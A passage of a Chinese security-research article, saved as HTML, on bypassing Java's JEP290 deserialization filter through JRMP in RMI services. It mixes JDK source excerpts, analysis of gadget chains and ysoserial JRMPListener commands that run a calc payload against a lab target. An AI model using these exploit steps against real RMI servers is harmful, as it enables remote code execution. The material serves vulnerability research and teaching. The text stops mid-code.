+    <script src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/toc.min.js.下载"></script>
+    <script src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/dt.js.下载"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">针对RMI服务的九重攻击 - 下</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/20851">
+                        <span class="username cell"> 啦啦0咯咯</span></a> <span class="i-seprator"> / </span>
+                    <span> 2020-07-02 09:41:13</span><span class="i-seprator"> / </span>
+                    <span>浏览数 13649</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/1">安全技术</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/1">漏洞分析</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(7932);">
+             顶(1)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(7932);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <p>字数：1w5</p>
+<p>推荐阅读时间：&gt;2h</p>
+<h2 id="toc-0">前言</h2>
+<p>再看下RMI反序列化攻击的总结图：</p>
+<p><a id="img0" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200702100127-f0d4c18c-bc07-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200702100127-f0d4c18c-bc07-1.png"></a></p>
+<p>如果觉得有什么出入，喷就完事了；<br>
+同时觉得本文对你有帮助，<del>也请留言、评论、关注、一键三连支持你喜欢的up主！你的点赞是我更新的动力！如果这期点赞超过20w，下篇文章直播开.....</del></p>
+<p>咳...在上篇中已经讲述<strong>针对已知RMI接口的三种攻击方式</strong>与<strong>针对RMI层（RMI注册端、RMI服务端）/DGC层</strong>，得出了部分结论。</p>
+<p>而在下篇中将重点讲述<strong>绕过JEP290的引入JRMP的利用方式</strong>，这就很好玩了，指出了别的老哥的错误之处，找到了别人没提及的骚姿势，复现分析了老外的绕过方式。</p>
+<p>上下篇的小结论是沿用的，建议配合食用；文中实验代码、环境及工具均已上传<a href="https://github.com/lalajun/RMIDeserialize" target="_blank">github</a>。</p>
+<p>此外安利下<a href="https://github.com/wh1t3p1g/ysomap" target="_blank">ysomap</a>，如果没有意外的话，之后会陆续把这些攻击方式都移植过去。</p>
+<h2 id="toc-1">利用JRMP反序列化绕过JEP290</h2>
+<p>在上篇中我们所有攻击方式都给JEP290给干掉了，当然出了参数利用的方式，但是那种利用局限性太强了。来看看绕过JEP290的攻击方式。</p>
+<p>先进行攻击演示：</p>
+<ol>
+<li>使用github中的<code>ServerandRegister.java</code>作为受害者靶机</li>
+<li>运行<code>java -cp F:\BanZ\java\ysoserial.jar ysoserial.exploit.JRMPListener 1199 CommonsCollections5 "calc"</code>作为攻击者自实现的JRMP服务端</li>
+<li>运行github中的<code>Bypass290.java</code>作为攻击代码</li>
+</ol>
+<p><a id="img1" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622150927-4f8fe94e-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622150927-4f8fe94e-b457-1.png"></a></p>
+<p>再来讲绕过原理的前置知识：</p>
+<h3 id="toc-2">JRMP服务端打JRMP客户端(ysoserial.exploit.JRMPListener)</h3>
+<blockquote><p>这其实就是ysoserial.exploit.JRMPListener模块的攻击逻辑</p>
+<p>其实之前标题为DGC服务端打DGC客户端，在别的文章评论区如此说的时候，被<a href="https://www.anquanke.com/post/id/204740#h2-15" target="_blank">老哥</a>指出来不对：这里的漏洞触发跟DGC没关系。</p>
+<p>实际去仔细看了调用栈的确不经过DGC，由于自己看的时候是从<code>sun.rmi.transport.DGCImpl_Stub#dirty</code>跳转进去的所以就当成DGC层。</p>
+<p>实际上应该归为JRMP层，JRMP是DGC和RMI底层通讯层，DGC和RMI的最终调用都回到JRMP这一层来，但是这种理论归属知道个大概就好，其实我也不是很确定QAQ。</p>
+</blockquote>
+<p>我们之前在看DGC层反序列化的时候，下的客户端断点是在<code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code>，然后回退到调用栈的dirty方法中。</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">Lease</span> <span class="nf">dirty</span><span class="o">(</span><span class="n">ObjID</span><span class="o">[]</span> <span class="n">var1</span><span class="o">,</span> <span class="kt">long</span> <span class="n">var2</span><span class="o">,</span> <span class="n">Lease</span> <span class="n">var4</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//开启了一个连接，似曾相识的 669196253586618813L 在服务端也有</span>
+            <span class="n">RemoteCall</span> <span class="n">var5</span> <span class="o">=</span> <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="k">this</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="mi">1</span><span class="o">,</span> <span class="o">-</span><span class="mi">669196253586618813L</span><span class="o">);</span>
+
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//获取连接的输入流</span>
+                <span class="n">ObjectOutput</span> <span class="n">var6</span> <span class="o">=</span> <span class="n">var5</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+                <span class="c1">//***DGC客户端攻击DGC服务端的payload写入处***</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var1</span><span class="o">);</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeLong</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+                <span class="n">var6</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">var4</span><span class="o">);</span>
+            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">IOException</span> <span class="n">var20</span><span class="o">)</span> <span class="o">{</span>
+                <span class="k">throw</span> <span class="k">new</span> <span class="n">MarshalException</span><span class="o">(</span><span class="s">"error marshalling arguments"</span><span class="o">,</span> <span class="n">var20</span><span class="o">);</span>
+            <span class="o">}</span>
+            <span class="c1">//进入此处</span>
+            <span class="kd">super</span><span class="o">.</span><span class="na">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var5</span><span class="o">);</span>
+</pre></div>
+<p>dirty方法中通过<code>super.ref.invoke(var5);</code>进入<code>sun.rmi.server.UnicastRef#invoke</code></p>
+<p>在这里进行了</p>
+<ol>
+<li>发送了之前处理好的序列化数据包</li>
+<li>处理了服务端的报错返回。而<strong>反序列化问题正是出现在这里</strong></li>
+</ol>
+<p><code>sun.rmi.server.UnicastRef#invoke(java.rmi.server.RemoteCall)</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">invoke</span><span class="o">(</span><span class="n">RemoteCall</span> <span class="n">call</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//写个日志，不管</span>
+            <span class="n">clientRefLog</span><span class="o">.</span><span class="na">log</span><span class="o">(</span><span class="n">Log</span><span class="o">.</span><span class="na">VERBOSE</span><span class="o">,</span> <span class="s">"execute call"</span><span class="o">);</span>
+           <span class="c1">//跟进此处</span>
+            <span class="n">call</span><span class="o">.</span><span class="na">executeCall</span><span class="o">();</span>
+            <span class="c1">//...省略一堆报错处理</span>
+</pre></div>
+<p><code>sun.rmi.transport.StreamRemoteCall#executeCall</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">executeCall</span><span class="o">()</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+        <span class="kt">byte</span> <span class="n">returnType</span><span class="o">;</span>
+
+        <span class="c1">// read result header</span>
+        <span class="n">DGCAckHandler</span> <span class="n">ackHandler</span> <span class="o">=</span> <span class="kc">null</span><span class="o">;</span>
+        <span class="k">try</span> <span class="o">{</span>
+            <span class="c1">//...这里发包和接受返回状态returnType和返回包数据流in</span>
+            <span class="n">returnType</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readByte</span><span class="o">();</span>  <span class="c1">//1. 反序列化一个returnType</span>
+            <span class="n">in</span><span class="o">.</span><span class="na">readID</span><span class="o">();</span>        <span class="c1">// 2. 反序列化一个id for DGC acknowledgement</span>
+            <span class="c1">//具体细节比较复杂不看了</span>
+        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">UnmarshalException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+            <span class="c1">//..略..</span>
+        <span class="o">}</span>
+
+        <span class="c1">// 处理returnType返回状态</span>
+        <span class="k">switch</span> <span class="o">(</span><span class="n">returnType</span><span class="o">)</span> <span class="o">{</span>
+        <span class="c1">//这是常量1</span>
+        <span class="k">case</span> <span class="n">TransportConstants</span><span class="o">.</span><span class="na">NormalReturn</span><span class="o">:</span>
+            <span class="k">break</span><span class="o">;</span>
+        <span class="c1">//这是常量2</span>
+        <span class="k">case</span> <span class="n">TransportConstants</span><span class="o">.</span><span class="na">ExceptionalReturn</span><span class="o">:</span>
+            <span class="n">Object</span> <span class="n">ex</span><span class="o">;</span>
+            <span class="k">try</span> <span class="o">{</span>
+                <span class="c1">//3. 从服务端返回数据流in中读取，并反序列化</span>
+                <span class="c1">//***漏洞触发点***</span>
+                <span class="n">ex</span> <span class="o">=</span> <span class="n">in</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+                <span class="c1">//省略之后代码</span>
+</pre></div>
+<p>JRMP客户端反序列化顺序：</p>
+<ol>
+<li>反序列化服务端给的returnType</li>
+<li>反序列化服务端给的一个ID</li>
+<li>反序列化服务端给的报错信息</li>
+</ol>
+<blockquote><p>小问题：为啥一定要利用报错信息写payload，前两个不可以么？</p>
+<p>当然不可以，readObject才行，不懂的话..... 不懂你也看不到这里。。打扰了</p>
+<p>此外自己在看的时候发现了一个自己模糊的问题：JAVA反序列化序列化 是队列形式的还是栈形式的？</p>
+<p>即：out.writeObject(a)；out.writeObject(a)；out.readObejct()的结果是a还是b</p>
+<p>是a，队列形式</p>
+</blockquote>
+<p>那我们知道了JRMP客户端存在一个反序列化点，是可以被攻击，再来看看对应的服务端是在哪里插入payload的（我们已经知道了大概是一个报错信息处）</p>
+<p>这里网上的文章大多是直接拿yso exploit的JRMPlistener攻击代码来看了，那个代码是直接重构了JRMP服务端，把报错信息改成payload的，但是都没有说原生服务端在哪里写序列化。（虽然这个问题对于实际攻击利用没有太大意义，还是来看下）</p>
+<p>可以看到上面客户端代码对于服务端传输过来的<code>returnType</code>判断为<code>TransportConstants.ExceptionalReturn</code>才会进入反序列化流程。那么我们来全局搜索<code>TransportConstants.ExceptionalReturn</code>就可以找到服务端在哪里写入的了。</p>
+<p>发现服务端的代码就在同个java文件下<code>sun.rmi.transport.StreamRemoteCall#getResultStream</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="n">ObjectOutput</span> <span class="nf">getResultStream</span><span class="o">(</span><span class="kt">boolean</span> <span class="n">success</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">IOException</span> <span class="o">{</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">resultStarted</span><span class="o">)</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="n">StreamCorruptedException</span><span class="o">(</span><span class="s">"result already in progress"</span><span class="o">);</span>
+    <span class="k">else</span>
+        <span class="n">resultStarted</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+
+    <span class="n">DataOutputStream</span> <span class="n">wr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">DataOutputStream</span><span class="o">(</span><span class="n">conn</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
+    <span class="n">wr</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">Return</span><span class="o">);</span>
+    <span class="n">getOutputStream</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  
+    <span class="c1">//success为false，进入我们的分支</span>
+    <span class="k">if</span> <span class="o">(</span><span class="n">success</span><span class="o">)</span>  
+        <span class="n">out</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">NormalReturn</span><span class="o">);</span>
+    <span class="k">else</span>
+        <span class="c1">//*******这里第一个序列化returnType*******</span>
+        <span class="n">out</span><span class="o">.</span><span class="na">writeByte</span><span class="o">(</span><span class="n">TransportConstants</span><span class="o">.</span><span class="na">ExceptionalReturn</span><span class="o">);</span>
+    <span class="c1">//第二个序列化一个ID</span>
+    <span class="n">out</span><span class="o">.</span><span class="na">writeID</span><span class="o">();</span>          <span class="c1">// write id for gcAck</span>
+    <span class="k">return</span> <span class="n">out</span><span class="o">;</span>
+<span class="o">}</span>
+</pre></div>
+<p>这里反序列化了两个前置的参数，这个函数之后就是payload处的写入，全局搜索该函数的引用处（参数要false的）：</p>
+<p><a id="img2" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151009-68444dd6-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151009-68444dd6-b457-1.png"></a></p>
+<p>前两处在<code>sun.rmi.server.UnicastServerRef#dispatch</code>和<code>sun.rmi.server.UnicastServerRef#oldDispatch</code>中，但代码一样，写入了报错信息：</p>
+<div class="highlight"><pre><span></span><span class="c1">//这里出来</span>
+<span class="n">ObjectOutput</span> <span class="n">out</span> <span class="o">=</span> <span class="n">call</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">e</span> <span class="k">instanceof</span> <span class="n">Error</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerError</span><span class="o">(</span>
+        <span class="s">"Error occurred in server thread"</span><span class="o">,</span> <span class="o">(</span><span class="n">Error</span><span class="o">)</span> <span class="n">e</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">e</span> <span class="k">instanceof</span> <span class="n">RemoteException</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ServerException</span><span class="o">(</span>
+        <span class="s">"RemoteException occurred in server thread"</span><span class="o">,</span>
+        <span class="o">(</span><span class="n">Exception</span><span class="o">)</span> <span class="n">e</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="k">if</span> <span class="o">(</span><span class="n">suppressStackTraces</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">clearStackTraces</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+<span class="o">}</span>
+<span class="c1">//第三处序列化：序列化写入报错信息，也就是payload插入处</span>
+<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+</pre></div>
+<p>后一处在<code>sun.rmi.transport.Transport#serviceCall</code>中，清空了调用栈，然后写入了报错信息。</p>
+<div class="highlight"><pre><span></span><span class="n">ObjectOutput</span> <span class="n">out</span> <span class="o">=</span> <span class="n">call</span><span class="o">.</span><span class="na">getResultStream</span><span class="o">(</span><span class="kc">false</span><span class="o">);</span>
+<span class="n">UnicastServerRef</span><span class="o">.</span><span class="na">clearStackTraces</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+<span class="c1">//第三处序列化：序列化写入报错信息，也就是payload插入处</span>
+<span class="n">out</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+<span class="n">call</span><span class="o">.</span><span class="na">releaseOutputStream</span><span class="o">();</span>
+</pre></div>
+<p>那么<strong>服务端在三处地方可以写入payload</strong>去发起对于客户端的请求（其实应该还有更多地方，比如我们下断点找过来的路径就不是这三个的任何一个），找到之后我们就会发现，我们没法去利用原生的payload插入处，去插入payload。因为他们都是写入了报错信息，我们没法去控制。</p>
+<p>那么就只有自实现拼接出一个JRMP服务端，来发送给JRMP客户端一个序列化数据，这就是<strong>YSOSERIAL-exploit-JRMPListener</strong>做的事情。</p>
+<p>但是我们的这里的重点不是研究<strong>JRMPListener</strong>，所以不详细说明了</p>
+<h4>复现</h4>
+<p><strong>我们可以通过github里的JRMPClient和ysoserial来复现一下JRMP服务端打客户端的过程。</strong></p>
+<p>起一个JRMP服务端<code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "calc"</code></p>
+<p>这个exploit会对任何请求回应一个响应包，其中报错信息被替换成了CC5链的Object payload。</p>
+<p>然后客户端运行<code>JRMPClient.java</code></p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">JRMPClient</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+        <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
+        <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">"hello"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</pre></div>
+<p><a id="img3" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151039-7a8cd5c6-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151039-7a8cd5c6-b457-1.png"></a></p>
+<p>成功，而且非常有趣，我们测试的JDK是在JEP290（8u121）修复之后！</p>
+<p>这说明<strong>JRMP服务端打JRMP客户端的攻击方法不受JEP290的限制！</strong></p>
+<p><strong>为什么？</strong></p>
+<p>因为之前也说到JEP290默认只为<strong>RMI注册表</strong>（RMI Register层）和<strong>RMI分布式垃圾收集器</strong>（DGC层）提供了相应的内置过滤器，但是最底层的JRMP是没有做过滤器的。所以可以攻击执行payload</p>
+<p>那么有没有可能我们把这个可以绕过JEP290的攻击方式与几种之前被白名单拦截的攻击路径结合呢？</p>
+<h3 id="toc-3">与RMI服务端反序列化攻击RMI注册端-Bind结合</h3>
+<p>我们的期待中的攻击流程如下（偷一张老外大佬的图）：</p>
+<p><a id="img4" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151053-82ab02d2-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151053-82ab02d2-b457-1.png"></a></p>
+<p><strong>上面一条线</strong><code>registry,bind(name,object)</code>是我们RMI服务端bind攻击RMI注册端的攻击路线，但是由于JEP290加入了反序列化过滤器，我们的诸多利用链比如CC被白名单限制失效了。具体细节如下：</p>
+<div class="highlight"><pre><span></span><span class="n">数组最大长度maxarray</span><span class="o">=</span><span class="mi">1000000</span><span class="o">;</span>
+<span class="n">调用栈最大深度maxdepth</span><span class="o">=</span><span class="mi">20</span><span class="o">;</span>
+<span class="n">白名单要求如下</span><span class="err">：</span>
+<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">String</span><span class="o">;</span>
+<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">Number</span><span class="o">;</span>
+<span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Proxy</span><span class="o">;</span>
+<span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">Remote</span><span class="o">;</span>
+<span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">UnicastRef</span><span class="o">;</span>
+<span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RMIClientSocketFactory</span><span class="o">;</span>
+<span class="n">sun</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">RMIServerSocketFactory</span><span class="o">;</span>
+<span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">activation</span><span class="o">.</span><span class="na">ActivationID</span><span class="o">;</span>
+<span class="n">java</span><span class="o">.</span><span class="na">rmi</span><span class="o">.</span><span class="na">server</span><span class="o">.</span><span class="na">UID</span>
+</pre></div>
+<p>而<strong>下面两条线</strong>对应着我们刚才分析的<strong>JRMP服务端打JRMP客户端</strong>的过程：</p>
+<ol>
+<li>要RMI注册端作为JRMP客户端去主动连接我们的JRMP服务端（白名单过滤器只对反序列化过程有效，对序列化过程无效）</li>
+<li>我们恶意的JRMP服务端在原本是报错信息的位置写入利用链，序列化成数据包返回到JRMP客户端（RMI注册端）。</li>
+<li>由于JRMP客户端的反序列化过程不存在JEP290的过滤器，所以我们的payload可以成功被执行，从而完成RCE。</li>
+</ol>
+<p>那么显而易见这个攻击组合中<strong>唯一缺失的板块</strong>就是：让原本目标是直接命令执行的第一条bind攻击，转换目标成<strong>让RMI注册端去作为JRMP客户端向我们指定的JRMP服务端去发起请求</strong>，从而完成一整个攻击链的衔接，这需要我们去寻<strong>找一个所有对象都在白名单中的Gadget</strong>去完成这一任务。</p>
+<blockquote><p>细想这个过程，会发现这个过程跟fastjson的JNDI注入攻击模式很相似，用一个payload去诱导目标服务器发起一个外部连接，连接到我们控制的恶意服务，恶意服务再去返回payload从而在服务器上完成命令执行。</p>
+<p>它也跟我们所说的内网渗透中的免杀平台很像，我们只需要免杀平台免杀（对应JRMP攻击链逃过JEP290），然后外部命令都在免杀平台（通过JRMP攻击链）上执行。</p>
+</blockquote>
+<p>理顺一下我们的目标：</p>
+<ol>
+<li>我们要找一个Gadget，它在服务端的反序列化的过程中，会对我们指定的JRMP服务器发起JRMP连接。</li>
+<li>在找到这个Gadget之后，我们需要进一步将它封装进入<code>register.bind(String,Remote)</code>中。（为了满足客户端的格式需求）</li>
+</ol>
+<p>那么我们先来第一步：找Gadget。</p>
+<p>假如让我们自己真的从零开始找这个Gadget，我们应该先找出所有会向服务器发起JRMP请求的最底层方法，然后向上看何处调用了这个方法来进行一层层逆推，直到找到一个对象的反序列化入口（比如readobject）。那么再从反序列化入口反过来拎起来就是一个Gadget。</p>
+<p>但是在看别人的Gadget的时候就从反序列化口子开始看便于理解。</p>
+<h4>UnicastRef对象</h4>
+<p>Ysoserial中的payloads-JRMPClient就是一个可以完成JRMP服务器发起JRMP连接的调用栈：</p>
+<div class="highlight"><pre><span></span><span class="o">/**</span> 
+ <span class="o">*</span> <span class="n">UnicastRef</span><span class="o">.</span><span class="na">newCall</span><span class="o">(</span><span class="n">RemoteObject</span><span class="o">,</span> <span class="n">Operation</span><span class="o">[],</span> <span class="kt">int</span><span class="o">,</span> <span class="kt">long</span><span class="o">)</span><span class="err">（！！</span><span class="n">JRMP请求的发送处</span><span class="err">！！）</span>
+ <span class="o">*</span> <span class="n">DGCImpl_Stub</span><span class="o">.</span><span class="na">dirty</span><span class="o">(</span><span class="n">ObjID</span><span class="o">[],</span> <span class="kt">long</span><span class="o">,</span> <span class="n">Lease</span><span class="o">)</span><span class="err">（</span><span class="n">这里是我们上面JRMP服务端打客户端</span><span class="err">，</span><span class="n">客户端的反序列化触发处</span><span class="err">）</span>
+ <span class="o">*</span> <span class="n">DGCClient$EndpointEntry</span><span class="o">.</span><span class="na">makeDirtyCall</span><span class="o">(</span><span class="n">Set</span><span class="o">&lt;</span><span class="n">RefEntry</span><span class="o">&gt;,</span> <span class="kt">long</span><span class="o">)</span>
+ <span class="o">*</span> <span class="n">DGCClient$EndpointEntry</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">(</span><span class="n">List</span><span class="o">&lt;</span><span class="n">LiveRef</span><span class="o">&gt;)</span>
+ <span class="o">*</span> <span class="n">DGCClient</span><span class="o">.</span><span class="na">registerRefs</span><span class="o">(</span><span class="n">Endpoint</span><span class="o">,</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">LiveRef</span><span class="o">&gt;)</span>
+ <span class="o">------</span><span class="n">这里实际上不是一个连贯的调用栈</span><span class="o">,</span><span class="n">之后说明</span><span class="o">-----</span>
+ <span class="o">*</span> <span class="n">LiveRef</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">ObjectInput</span><span class="o">,</span> <span class="kt">boolean</span><span class="o">)</span>
+ <span class="o">*</span> <span class="n">UnicastRef</span><span class="o">.</span><span class="na">readExternal</span><span class="o">(</span><span class="n">ObjectInput</span><span class="o">)</span><span class="err">（！！</span><span class="n">反序列化的入口</span><span class="err">！！）</span>
+</pre></div>
+<p>可能有的同学对于<code>UnicastRef.readExternal()</code>作为反序列化的入口有点疑惑，其实我们在 <strong>JAVA反序列化-基础</strong> 中提到过这个。反序列化的入口其实不止readobject()，还有readExternal()，只不过后者稍微少见点。</p>
+<p>在实际触发的时候，这个触发过程其实不是我们常见的readobject进来一路向下就直接完成触发的调用栈，它其实分为两部分</p>
+<ol>
+<li>readObject()：组装填入ref</li>
+<li>releaseInputStream()：统一处理ref</li>
+</ol>
+<p>看bind的反序列化过程：</p>
+<div class="highlight"><pre><span></span><span class="k">try</span> <span class="o">{</span>
+    <span class="n">var9</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getInputStream</span><span class="o">();</span><span class="c1">//var2是我们的输入流</span>
+    <span class="n">var7</span> <span class="o">=</span> <span class="o">(</span><span class="n">String</span><span class="o">)</span><span class="n">var9</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span><span class="c1">//略过</span>
+    <span class="c1">//payload在这，在readobject中递归调用属性，进入UnicastRef#readExternal</span>
+    <span class="c1">//在其中完成了ref的填装</span>
+    <span class="n">var80</span> <span class="o">=</span> <span class="o">(</span><span class="n">Remote</span><span class="o">)</span><span class="n">var9</span><span class="o">.</span><span class="na">readObject</span><span class="o">();</span>
+<span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">ClassNotFoundException</span> <span class="o">|</span> <span class="n">IOException</span> <span class="n">var77</span><span class="o">)</span> <span class="o">{</span>
+    <span class="k">throw</span> <span class="k">new</span> <span class="n">UnmarshalException</span><span class="o">(</span><span class="s">"error unmarshalling arguments"</span><span class="o">,</span> <span class="n">var77</span><span class="o">);</span>
+<span class="o">}</span> <span class="k">finally</span> <span class="o">{</span>
+    <span class="c1">//在这里处理ref的时候才真正完成了触发</span>
+    <span class="n">var2</span><span class="o">.</span><span class="na">releaseInputStream</span><span class="o">();</span>
+<span class="o">}</span>
+</pre></div>
+<p>也就是说实际上<strong>JRMP服务器发起JRMP连接</strong>的时候是在<code>var2.releaseInputStream();</code>的语句中。</p>
+<p>我们从<code>var9.readObject();</code>反序列化入口开始跟一遍：</p>
+<p><a id="img5" href="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151138-9d318464-b457-1.png"><img src="./针对RMI服务的九重攻击 - 下 - 先知社区_files/20200622151138-9d318464-b457-1.png"></a></p>
+<p><code>sun.rmi.server.UnicastRef#readExternal</code>:</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kt">void</span> <span class="nf">readExternal</span><span class="o">(</span><span class="n">ObjectInput</span> <span class="n">in</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span>
+    <span class="o">{</span>
+        <span class="n">ref</span> <span class="o">=</span> <span class="n">LiveRef</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">in</span><span class="o">,</span> <span class="kc">false</span><span class="o">);</span><span class="c1">//---进入此处----</span>
+    <span class="o">}</span>
+</pre></div>
+<p><code>sun.rmi.transport.LiveRef#read</code>：</p>
+<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">static</span> <span class="n">LiveRef</span> <span class="nf">read</span><span class="o">(</span><span class="n">ObjectInput</span> <span class="n">in</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">useNewFormat</span><span class="o">)</span>
+        <span class="kd">throws</span> <span class="n">IOException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span>
+    <span class="o">{</span>
+        <span class="n">Endpoint</span> <span class="n">ep</span><span class="o">;</span>
+        <span class="n">ObjID</span> <span class="n">id</span><span class="o">;</span>
+
+        <span class="c1">// 从输入流中读取endpoint, id和result flag</span>
+        <span class="c1">// 一个固定的格式版本判断，根据JDK版本有关</span>
+        <span class="k">if</span> <span class="o">(</span><span class="n">useNewFormat</span><span class="o">)</span> <span class="o">{</span>
+            <span class="n">ep</span> <span class="o">=</span> <span class="n">TCPEndpoint</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+        <span class="o">}</span> <span class="k">else</span> <span class="o">{</span>
+            <span class="c1">//读取</span>
+            <span class="n">ep</span> <span class="o">=</span> <span class="n">TCPEndpoint</span><span class="o">.</span><span class="na">readHostPortFormat</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
+        <span class="o">}</span>
+        <span class="n">id</span> <span class="o">=</span> <span class="n">ObjID</span><span class="o">.</span><span class="na">read</span><span class="o">(</span><span class="n">in</span><span class="o">);</span>
